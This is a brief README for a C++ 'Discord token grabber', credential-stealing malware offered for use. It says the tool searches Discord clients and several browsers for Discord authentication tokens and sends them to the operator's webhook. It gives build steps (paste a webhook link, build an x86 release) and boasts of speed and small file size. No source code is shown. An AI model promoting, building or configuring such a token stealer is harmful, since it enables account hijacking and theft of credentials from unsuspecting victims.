# DiscordTokenGrabber
A discord token grabber written in C++. 

It searches for tokens in Discord, Discord PTB, Discord Canary, Chrome, Opera, Brave and Yandex directories. Once it finds a token, it sends it to your webhook.  

Faster and better performance than a Python token grabber and a smaller file size.  

HOW TO USE: 
1 - Make sure you have Visual Studio 2019 with C++ installed. 
2 - Open the .sln project and then open the Token-Disc.cpp file. 
3 - Paste your webhook link 
4 - Build x86 release  

You need curl-7.75.0, and the MFC package installed.
